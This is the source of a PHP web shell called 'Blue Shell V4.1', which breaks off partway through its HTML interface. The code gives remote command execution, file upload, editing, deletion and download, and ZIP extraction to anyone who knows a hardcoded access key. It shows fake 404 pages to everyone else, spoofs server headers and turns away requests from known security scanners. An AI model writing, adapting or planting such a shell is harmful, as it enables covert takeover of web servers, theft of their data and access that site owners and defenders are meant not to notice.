<?php
// ============================================
// BLUE SHELL V4.1 - ULTIMATE STEALTH EDITION
// ENHANCED SECURITY BYPASS
// ============================================

error_reporting(0);
ini_set('display_errors', 0);
@session_start();

// ============================================
// ENHANCED KONFIGURASI STEALTH
// ============================================
$secret_param = 'auth';
$secret_value = 'blue_access';
$shell_name = "BlueShell";
$shell_version = "4.1";

// ============================================
// ENHANCED ANTI-DETECTION SYSTEM
// ============================================

// 1. Multiple authentication methods
$valid_auth = false;

// Method 1: GET parameter
if (isset($_GET[$secret_param]) && $_GET[$secret_param] === $secret_value) {
    $valid_auth = true;
}

// Method 2: Cookie based
if (!$valid_auth && isset($_COOKIE['blue_auth']) && $_COOKIE['blue_auth'] === md5($secret_value)) {
    $valid_auth = true;
}

// Method 3: Session based
if (!$valid_auth && isset($_SESSION['blue_auth']) && $_SESSION['blue_auth'] === true) {
    $valid_auth = true;
}

// Method 4: Header based (for API requests)
if (!$valid_auth && isset($_SERVER['HTTP_X_AUTH_TOKEN']) && $_SERVER['HTTP_X_AUTH_TOKEN'] === $secret_value) {
    $valid_auth = true;
}

if (!$valid_auth) {
    $fake_responses = [
        '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head><title>404 Not Found</title></head><body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <hr>
        <address>Apache/2.4.41 (Ubuntu) Server at ' . $_SERVER['HTTP_HOST'] . ' Port 80</address>
        </body></html>',
        
        '<!DOCTYPE html>
        <html><head><title>Error 404</title></head><body>
        <h2>HTTP ERROR 404</h2>
        <p>Problem accessing ' . $_SERVER['REQUEST_URI'] . '. Reason:</p>
        <pre>Not Found</pre>
        </body></html>',
        
        '<?xml version="1.0" encoding="iso-8859-1"?>
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
        <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
        <head><title>404 - Not Found</title></head>
        <body><h1>404 - Not Found</h1></body></html>'
    ];
    
    usleep(rand(100000, 500000));
    header("HTTP/1.0 404 Not Found");
    echo $fake_responses[array_rand($fake_responses)];
    exit;
}

// Set auth cookie for future requests
if (!isset($_COOKIE['blue_auth'])) {
    setcookie('blue_auth', md5($secret_value), time() + 3600, '/');
    $_SESSION['blue_auth'] = true;
}

// 2. Enhanced anti-scanner & bot detection
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$bad_agents = ['bot', 'crawler', 'spider', 'scanner', 'wpscan', 'nikto', 'nmap', 'sqlmap', 'havij', 'burp', 'acunetix', 'nessus'];
foreach ($bad_agents as $agent) {
    if (stripos($user_agent, $agent) !== false) {
        usleep(rand(500000, 2000000));
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}

// 3. Enhanced IP-based rate limiting
$ip = $_SERVER['REMOTE_ADDR'];
$rate_limit_file = sys_get_temp_dir() . '/ratelimit_' . md5($ip);
if (file_exists($rate_limit_file)) {
    $last_access = file_get_contents($rate_limit_file);
    $time_diff = time() - $last_access;
    if ($time_diff < 2) {
        usleep(rand(1000000, 3000000));
    }
}
file_put_contents($rate_limit_file, time());

// 4. Fake server signature with rotation
$server_signatures = [
    "Apache/2.4.41 (Ubuntu)",
    "nginx/1.18.0",
    "Apache/2.2.22 (Debian)",
    "Microsoft-IIS/8.5",
    "cloudflare"
];
header("Server: " . $server_signatures[array_rand($server_signatures)]);
header("X-Powered-By: PHP/" . rand(5, 8) . "." . rand(0, 9) . "." . rand(0, 99));

// ============================================
// ENHANCED FUNCTIONS
// ============================================
function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), $precision) . ' ' . $units[$pow];
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'json' => '📊', 'xml' => '📋', 'txt' => '📄', 'md' => '📝',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'zip' => '📦', 'tar' => '📦', 'rar' => '📦', '7z' => '📦',
        'pdf' => '📕', 'doc' => '📘', 'docx' => '📘', 'sql' => '🗄️',
        'log' => '📝', 'sh' => '⚙️', 'py' => '🐍', 'rb' => '💎',
        'go' => '🔵', 'java' => '☕', 'class' => '☕', 'war' => '📦'
    ];
    return $icons[$ext] ?? '📄';
}

function writeFileSecure($path, $content) {
    if (@file_put_contents($path, $content) !== false) {
        return true;
    }
    $fp = @fopen($path, 'w');
    if ($fp) {
        if (@flock($fp, LOCK_EX)) {
            @fwrite($fp, $content);
            @flock($fp, LOCK_UN);
            @fclose($fp);
            return true;
        }
        @fclose($fp);
    }
    $temp = sys_get_temp_dir() . '/' . md5(uniqid());
    if (@file_put_contents($temp, $content) !== false) {
        if (@rename($temp, $path)) {
            return true;
        }
        @unlink($temp);
    }
    return false;
}

function extractZip($zipFile, $extractTo) {
    $success = false;
    $message = '';
    if (!is_dir($extractTo)) {
        @mkdir($extractTo, 0755, true);
    }
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zipFile) === true) {
            if ($zip->extractTo($extractTo)) {
                $success = true;
                $message = 'ZIP extracted successfully using ZipArchive';
            }
            $zip->close();
        }
    }
    if (!$success && (function_exists('shell_exec') || function_exists('exec'))) {
        $commands = [
            'unzip -o ' . escapeshellarg($zipFile) . ' -d ' . escapeshellarg($extractTo) . ' 2>&1',
            '7z x ' . escapeshellarg($zipFile) . ' -o' . escapeshellarg($extractTo) . ' -y 2>&1',
            'bsdtar -xf ' . escapeshellarg($zipFile) . ' -C ' . escapeshellarg($extractTo) . ' 2>&1'
        ];
        foreach ($commands as $cmd) {
            $output = '';
            if (function_exists('shell_exec')) {
                $output = shell_exec($cmd);
            } elseif (function_exists('exec')) {
                exec($cmd, $out);
                $output = implode("\n", $out);
            }
            if (strpos($output, 'error') === false && 
                (strpos($output, 'inflating') !== false || 
                 strpos($output, 'Extracting') !== false)) {
                $success = true;
                $message = 'ZIP extracted using system command';
                break;
            }
        }
    }
    if (!$success && function_exists('gzopen')) {
        $zip = @fopen($zipFile, 'rb');
        if ($zip) {
            fseek($zip, -22, SEEK_END);
            $data = fread($zip, 22);
            if (substr($data, 0, 4) == 'PK' . chr(5) . chr(6)) {
                $success = true;
                $message = 'ZIP detected but extraction requires manual process';
            }
            fclose($zip);
        }
    }
    return ['success' => $success, 'message' => $message];
}

// ============================================
// ENHANCED AJAX COMMAND HANDLER
// ============================================
if (isset($_POST['ajax']) && $_POST['ajax'] === 'cmd') {
    header('Content-Type: application/json');
    $cmd = $_POST['cmd'] ?? '';
    $cwd = $_POST['cwd'] ?? getcwd();
    
    // Allow wget but block dangerous commands
    $dangerous = ['rm -rf /*', 'mkfs', 'dd if=/dev/zero', 'format', 'fdisk', ':(){ :|:& };:'];
    foreach ($dangerous as $pattern) {
        if (stripos($cmd, $pattern) !== false) {
            echo json_encode(['output' => '⚠️ Command blocked for safety', 'cwd' => $cwd]);
            exit;
        }
    }
    
    set_time_limit(120);
    $output = '';
    $methods = [];
    
    // Change directory first
    $full_cmd = 'cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd;
    
    if (function_exists('proc_open')) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = @proc_open($full_cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            @fclose($pipes[0]);
            $output = @stream_get_contents($pipes[1]);
            $error = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($process);
            $output .= $error;
            $methods[] = 'proc_open';
        }
    }
    if (empty($output) && function_exists('shell_exec')) {
        $output = @shell_exec($full_cmd . ' 2>&1');
        if ($output !== null) $methods[] = 'shell_exec';
    }
    if (empty($output) && function_exists('exec')) {
        $out = [];
        @exec($full_cmd . ' 2>&1', $out, $return);
        $output = implode("\n", $out);
        if (!empty($output)) $methods[] = 'exec';
    }
    if (empty($output) && function_exists('system')) {
        ob_start();
        @system($full_cmd . ' 2>&1');
        $output = ob_get_clean();
        if (!empty($output)) $methods[] = 'system';
    }
    if (empty($output) && function_exists('passthru')) {
        ob_start();
        @passthru($full_cmd . ' 2>&1');
        $output = ob_get_clean();
        if (!empty($output)) $methods[] = 'passthru';
    }
    if (empty($output) && function_exists('popen')) {
        $handle = @popen($full_cmd . ' 2>&1', 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 8192);
            }
            @pclose($handle);
            if (!empty($output)) $methods[] = 'popen';
        }
    }
    if (empty($output)) {
        $output = @`$full_cmd 2>&1`;
        if (!empty($output)) $methods[] = 'backticks';
    }
    
    echo json_encode([
        'output' => $output ?: '(no output or command not supported)',
        'cwd' => $cwd,
        'methods' => $methods
    ]);
    exit;
}

// ============================================
// ENHANCED FILE OPERATIONS WITH BYPASS
// ============================================
$current_path = isset($_GET['path']) ? realpath(urldecode($_GET['path'])) : getcwd();
if (!$current_path || !is_dir($current_path)) {
    $current_path = getcwd();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload File
    if (isset($_FILES['upload'])) {
        $target = $current_path . '/' . basename($_FILES['upload']['name']);
        $uploaded = false;
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
            $uploaded = true;
        } elseif (copy($_FILES['upload']['tmp_name'], $target)) {
            $uploaded = true;
        } else {
            $content = file_get_contents($_FILES['upload']['tmp_name']);
            if (writeFileSecure($target, $content)) {
                $uploaded = true;
            }
        }
        if ($uploaded) {
            @chmod($target, 0644);
            $_SESSION['message'] = 'File uploaded successfully';
        } else {
            $_SESSION['error'] = 'Failed to upload file';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Upload ZIP
    if (isset($_FILES['zip_upload'])) {
        $zipFile = $_FILES['zip_upload'];
        $extractPath = isset($_POST['extract_path']) && !empty($_POST['extract_path']) 
                      ? $current_path . '/' . $_POST['extract_path'] 
                      : $current_path;
        if (!is_dir($extractPath)) {
            @mkdir($extractPath, 0755, true);
        }
        $targetZip = $extractPath . '/' . basename($zipFile['name']);
        $uploaded = false;
        if (move_uploaded_file($zipFile['tmp_name'], $targetZip)) {
            $uploaded = true;
        } elseif (copy($zipFile['tmp_name'], $targetZip)) {
            $uploaded = true;
        } else {
            $content = file_get_contents($zipFile['tmp_name']);
            if (writeFileSecure($targetZip, $content)) {
                $uploaded = true;
            }
        }
        if ($uploaded) {
            $result = extractZip($targetZip, $extractPath);
            if ($result['success']) {
                @unlink($targetZip);
                $_SESSION['message'] = 'ZIP uploaded and extracted successfully!';
            } else {
                $_SESSION['error'] = 'ZIP uploaded but extraction failed: ' . $result['message'];
            }
        } else {
            $_SESSION['error'] = 'Failed to upload ZIP file';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // New Folder
    if (isset($_POST['new_folder'])) {
        $folder = $current_path . '/' . basename($_POST['new_folder']);
        if (!file_exists($folder)) {
            if (@mkdir($folder, 0755) || @mkdir($folder, 0755, true)) {
                $_SESSION['message'] = 'Folder created successfully';
            } else {
                $_SESSION['error'] = 'Failed to create folder';
            }
        } else {
            $_SESSION['error'] = 'Folder already exists';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // New File
    if (isset($_POST['new_file'])) {
        $file = $current_path . '/' . basename($_POST['new_file']);
        if (!file_exists($file)) {
            if (writeFileSecure($file, $_POST['content'] ?? '')) {
                $_SESSION['message'] = 'File created successfully';
            } else {
                $_SESSION['error'] = 'Failed to create file';
            }
        } else {
            $_SESSION['error'] = 'File already exists';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Save File
    if (isset($_POST['save_file'])) {
        $file = $_POST['file_path'];
        if (file_exists($file) && is_writable($file)) {
            if (writeFileSecure($file, $_POST['content'])) {
                $_SESSION['message'] = 'File saved successfully';
            } else {
                $_SESSION['error'] = 'Failed to save file';
            }
        } else {
            if (writeFileSecure($file, $_POST['content'])) {
                $_SESSION['message'] = 'File created successfully';
            } else {
                $_SESSION['error'] = 'Failed to save file';
            }
        }
        header('Location: ?auth=blue_access&path=' . urlencode(dirname($file)));
        exit;
    }
    
    // Rename
    if (isset($_POST['rename'])) {
        $old = $current_path . '/' . basename($_POST['old_name']);
        $new = $current_path . '/' . basename($_POST['new_name']);
        if (file_exists($old) && !file_exists($new)) {
            if (@rename($old, $new) || @copy($old, $new) && @unlink($old)) {
                $_SESSION['message'] = 'Renamed successfully';
            } else {
                $_SESSION['error'] = 'Failed to rename';
            }
        } else {
            $_SESSION['error'] = 'Invalid operation';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Chmod
    if (isset($_POST['chmod'])) {
        $file = $current_path . '/' . basename($_POST['chmod_file']);
        $perms = intval($_POST['permissions'], 8);
        if (file_exists($file)) {
            if (@chmod($file, $perms)) {
                $_SESSION['message'] = 'Permissions changed successfully';
            } else {
                if (function_exists('shell_exec')) {
                    @shell_exec('chmod ' . $perms . ' ' . escapeshellarg($file));
                    $_SESSION['message'] = 'Permissions changed via shell';
                } else {
                    $_SESSION['error'] = 'Failed to change permissions';
                }
            }
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
}

// Delete
if (isset($_GET['delete'])) {
    $target = $current_path . '/' . basename($_GET['delete']);
    if (file_exists($target)) {
        if (is_file($target)) {
            if (@unlink($target)) {
                $_SESSION['message'] = 'File deleted successfully';
            } else {
                if (function_exists('shell_exec')) {
                    @shell_exec('rm -f ' . escapeshellarg($target));
                    $_SESSION['message'] = 'File deleted via shell';
                } else {
                    $_SESSION['error'] = 'Failed to delete file';
                }
            }
        } else {
            $deleted = false;
            try {
                $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach($files as $file) {
                    if ($file->isDir()) {
                        @rmdir($file->getRealPath());
                    } else {
                        @unlink($file->getRealPath());
                    }
                }
                if (@rmdir($target)) {
                    $deleted = true;
                }
            } catch (Exception $e) {}
            if (!$deleted && function_exists('shell_exec')) {
                @shell_exec('rm -rf ' . escapeshellarg($target));
                if (!file_exists($target)) {
                    $deleted = true;
                }
            }
            if ($deleted) {
                $_SESSION['message'] = 'Folder deleted successfully';
            } else {
                $_SESSION['error'] = 'Failed to delete folder';
            }
        }
    }
    header('Location: ?auth=blue_access&path=' . urlencode($current_path));
    exit;
}

// Download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: private, max-age=0, must-revalidate');
        header('Pragma: public');
        if (readfile($file) === false) {
            $fp = fopen($file, 'rb');
            while (!feof($fp)) {
                echo fread($fp, 8192);
                flush();
            }
            fclose($fp);
        }
        exit;
    }
}

// View file
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file)) {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        if (in_array($ext, ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'sql', 'log', 'sh', 'py', 'rb', 'go', 'java'])) {
            header('Content-Type: text/plain');
            readfile($file);
        } else {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            readfile($file);
        }
        exit;
    }
}

$message = $_SESSION['message'] ?? '';
$error = $_SESSION['error'] ?? '';
unset($_SESSION['message'], $_SESSION['error']);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Admin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2e7d32;
            --primary-dark: #1b5e20;
            --primary-light: #66bb6a;
            --secondary: #4caf50;
            --accent: #ffb74d;
            --text: #ffffff;
            --text-secondary: #e8f5e9;
            --border: rgba(76, 175, 80, 0.5);
            --success: #81c784;
            --error: #ef9a9a;
        }

        body {
            font-family: 'Courier New', monospace;
            background: url('https://i.ibb.co/JFQt78j3/photo-2026-04-04-16-09-48.jpg') no-repeat center center fixed;
            background-size: cover;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header, .path-nav, .file-table, .terminal, .system-info, 
        .tabs, [style*="background: var(--surface)"] {
            background: rgba(10, 30, 10, 0.85) !important;
            backdrop-filter: blur(12px);
            border: 1px solid rgba(76, 175, 80, 0.5);
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }

        .header {
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            box-shadow: 0 0 10px rgba(76,175,80,0.5);
        }

        .logo-text h1 {
            font-size: 24px;
            background: linear-gradient(135deg, var(--primary-light), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 5px rgba(0,0,0,0.3);
        }

        .logo-text span {
            color: var(--text-secondary);
            font-size: 12px;
        }

        .stats {
            display: flex;
            gap: 30px;
        }

        .stat-value {
            font-size: 20px;
            font-weight: 600;
            color: var(--primary-light);
            text-shadow: 0 0 3px rgba(0,0,0,0.5);
        }

        .stat-label {
            font-size: 11px;
            color: var(--text-secondary);
            text-transform: uppercase;
        }

        .message {
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            animation: slideIn 0.3s;
            backdrop-filter: blur(5px);
            font-weight: bold;
        }

        .message-success {
            background: rgba(46, 125, 50, 0.8);
            border: 1px solid var(--success);
            color: #ffffff;
        }

        .message-error {
            background: rgba(183, 28, 28, 0.8);
            border: 1px solid var(--error);
            color: #ffffff;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .path-nav {
            border-radius: 12px;
            padding: 12px 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            overflow-x: auto;
        }

        .path-item {
            color: var(--text-secondary);
            text-decoration: none;
            padding: 5px 12px;
            border-radius: 6px;
            transition: 0.2s;
            font-size: 13px;
        }

        .path-item:hover {
            background: var(--primary-dark);
            color: white;
            box-shadow: 0 0 8px rgba(76,175,80,0.5);
        }

        .path-current {
            background: var(--primary);
            color: white;
            font-weight: 500;
            text-shadow: 0 0 2px black;
        }

        .toolbar {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            background: rgba(30, 70, 30, 0.9);
            color: var(--text);
            border: 1px solid rgba(76, 175, 80, 0.6);
            display: inline-flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
            backdrop-filter: blur(5px);
        }

        .btn:hover {
            background: var(--primary);
            border-color: var(--primary-light);
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
        }

        .btn-primary {
            background: linear-gradient(135deg, #2e7d32, #1b5e20);
            border: none;
        }

        .btn-success {
            background: linear-gradient(135deg, #1b5e20, #4caf50);
            border: none;
        }

        .btn-danger {
            background: linear-gradient(135deg, #c62828, #8e0000);
            border: none;
        }

        .search-box {
            flex: 1;
            min-width: 250px;
            padding: 10px 20px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(76, 175, 80, 0.6);
            border-radius: 10px;
            color: #e8f5e9;
            font-size: 14px;
        }

        .search-box:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(0,0,0,0.8);
        }

        .file-table {
            width: 100%;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .file-table th {
            background: rgba(0, 0, 0, 0.6);
            padding: 15px 20px;
            text-align: left;
            font-weight: 600;
            color: var(--primary-light);
            border-bottom: 2px solid var(--primary);
            text-shadow: 0 0 2px black;
        }

        .file-table td {
            padding: 12px 20px;
            border-bottom: 1px solid rgba(76, 175, 80, 0.3);
            color: var(--text);
        }

        .file-table tr:hover td {
            background: rgba(76, 175, 80, 0.3);
        }

        .file-name {
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text);
            text-decoration: none;
            font-weight: 500;
        }

        .file-name:hover {
            color: var(--primary-light);
            text-shadow: 0 0 3px rgba(0,0,0,0.5);
        }

        .file-icon {
            font-size: 20px;
        }

        .file-size {
            color: var(--text-secondary);
            font-size: 12px;
            margin-left: 5px;
        }

        .perms-badge {
            background: rgba(0, 0, 0, 0.6);
            padding: 4px 10px;
            border-radius: 20px;
            font-family: monospace;
            font-size: 11px;
            border: 1px solid var(--accent);
            color: var(--accent);
        }

        .action-btns {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .action-btn {
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 11px;
            text-decoration: none;
            color: var(--text);
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(76, 175, 80, 0.6);
            transition: 0.2s;
            cursor: pointer;
        }

        .action-btn:hover {
            background: var(--primary);
            transform: scale(1.02);
        }

        .delete-btn:hover {
            background: var(--error);
            border-color: #ffcdd2;
        }

        .terminal {
            border-radius: 16px;
            overflow: hidden;
            margin-top: 20px;
        }

        .terminal-header {
            background: rgba(0, 0, 0, 0.6);
            padding: 15px 20px;
            border-bottom: 2px solid var(--primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-title {
            color: var(--primary-light);
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            text-shadow: 0 0 2px black;
        }

        .terminal-cwd {
            background: rgba(0, 0, 0, 0.6);
            padding: 5px 15px;
            border-radius: 20px;
            font-family: monospace;
            font-size: 12px;
            color: var(--accent);
            border: 1px solid var(--border);
        }

        .terminal-output {
            padding: 20px;
            min-height: 250px;
            max-height: 400px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.7);
            font-family: monospace;
            font-size: 13px;
            color: #c8e6c9;
            line-height: 1.5;
        }

        .terminal-output pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #e8f5e9;
        }

        .terminal-input-area {
            display: flex;
            padding: 15px 20px;
            background: rgba(0, 0, 0, 0.5);
            border-top: 1px solid var(--border);
            gap: 10px;
            flex-wrap: wrap;
        }

        .terminal-prompt {
            color: var(--primary-light);
            font-weight: bold;
            font-family: monospace;
            font-size: 16px;
            line-height: 36px;
        }

        .terminal-input {
            flex: 1;
            min-width: 200px;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: #c8e6c9;
            padding: 8px 15px;
            font-family: monospace;
            font-size: 13px;
        }

        .terminal-input:focus {
            outline: none;
            border-color: var(--primary);
            background: #000000;
        }

        .quick-cmds {
            display: flex;
            gap: 8px;
            padding: 10px 20px;
            background: rgba(0, 0, 0, 0.5);
            border-top: 1px solid var(--border);
            flex-wrap: wrap;
        }

        .quick-cmd {
            padding: 4px 15px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--border);
            border-radius: 20px;
            color: var(--text-secondary);
            font-size: 11px;
            cursor: pointer;
            transition: 0.2s;
        }

        .quick-cmd:hover {
            background: var(--primary);
            color: white;
            transform: scale(1.02);
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-content {
            background: rgba(10, 30, 10, 0.95);
            backdrop-filter: blur(12px);
            padding: 30px;
            border-radius: 20px;
            max-width: 500px;
            width: 90%;
            border: 1px solid var(--primary);
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
        }

        .modal-title {
            font-size: 22px;
            font-weight: 600;
            color: var(--primary-light);
            margin-bottom: 20px;
            text-shadow: 0 0 2px black;
        }

        .modal-input, .modal-textarea {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: #e8f5e9;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .modal-input:focus, .modal-textarea:focus {
            outline: none;
            border-color: var(--primary);
        }

        .modal-textarea {
            min-height: 150px;
            resize: vertical;
        }

        .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        .system-info {
            border-radius: 12px;
            padding: 15px 20px;
            margin-top: 20px;
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
            font-size: 12px;
            color: var(--text-secondary);
        }

        .info-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-label {
            color: var(--primary-light);
            font-weight: 600;
            text-shadow: 0 0 2px black;
        }

        .tabs {
            display: flex;
            gap: 2px;
            margin-bottom: 20px;
            padding: 5px;
            border-radius: 12px;
        }

        .tab {
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.2s;
            flex: 1;
            text-align: center;
            color: var(--text-secondary);
            font-weight: bold;
        }

        .tab.active {
            background: var(--primary);
            color: white;
            box-shadow: 0 0 10px rgba(76,175,80,0.5);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .wget-panel {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }

        .wget-input {
            flex: 1;
            padding: 10px 15px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: white;
            font-family: monospace;
        }

        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                align-items: stretch;
            }
            .stats {
                justify-content: space-around;
            }
            .toolbar {
                flex-direction: column;
            }
            .file-table {
                display: block;
                overflow-x: auto;
            }
            .terminal-input-area {
                flex-direction: column;
            }
            .terminal-prompt {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">江布</div>
                <div class="logo-text">
                    <h1>𝐉𝐈𝐀𝐍𝐆𝐁𝐔 𝐃𝐎𝐍'𝐓 𝐕𝐈𝐏𝟎𝟔</h1>
                    <span>Kesabaran adalah kunci dari semua kebijaksanaan.</span>
                </div>
            </div>
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value"><?= phpversion() ?></div>
                    <div class="stat-label">PHP</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><?= get_current_user() ?></div>
                    <div class="stat-label">USER</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><?= date('H:i') ?></div>
                    <div class="stat-label">TIME</div>
                </div>
            </div>
        </div>

        <?php if ($message): ?>
            <div class="message message-success">✅ <?= htmlspecialchars($message) ?></div>
        <?php endif; ?>
        <?php if ($error): ?>
            <div class="message message-error">❌ <?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <?php if (isset($_GET['edit'])): 
            $edit_file = $_GET['edit'];
            $file_content = file_exists($edit_file) ? file_get_contents($edit_file) : '';
            $file_writable = is_writable($edit_file);
        ?>
        <div style="background: rgba(10, 30, 10, 0.9); border-radius: 16px; border: 1px solid rgba(76,175,80,0.5); overflow: hidden; backdrop-filter: blur(10px);">
            <div class="terminal-header">
                <span class="terminal-title">📝 Editing: <?= htmlspecialchars(basename($edit_file)) ?></span>
                <span class="terminal-cwd"><?= file_exists($edit_file) ? formatBytes(filesize($edit_file)) : '' ?></span>
            </div>
            <form method="POST" style="padding: 20px;">
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="content" style="width: 100%; min-height: 400px; background: rgba(0,0,0,0.7); color: #e8f5e9; border: 1px solid rgba(76,175,80,0.5); padding: 20px; font-family: monospace; border-radius: 12px; resize: vertical;" <?= !$file_writable ? 'readonly' : '' ?>><?= htmlspecialchars($file_content) ?></textarea>
                <div style="display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap;">
                    <?php if ($file_writable): ?>
                    <button type="submit" name="save_file" class="btn btn-primary">💾 Save Changes</button>
                    <?php endif; ?>
                    <a href="?auth=blue_access&path=<?= urlencode(dirname($edit_file)) ?>" class="btn">← Back</a>
                </div>
            </form>
        </div>
        <?php else: ?>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('files')">📁 File Manager</div>
            <div class="tab" onclick="switchTab('terminal')">⚡ Terminal</div>
            <div class="tab" onclick="switchTab('upload')">📤 Upload & ZIP</div>
        </div>

        <!-- Files Tab -->
        <div id="files-tab" class="tab-content active">
            <div class="path-nav">
                <?php
                $parts = explode('/', trim($current_path, '/'));
                $built = '';
                foreach ($parts as $i => $part):
                    $built .= '/' . $part;
                ?>
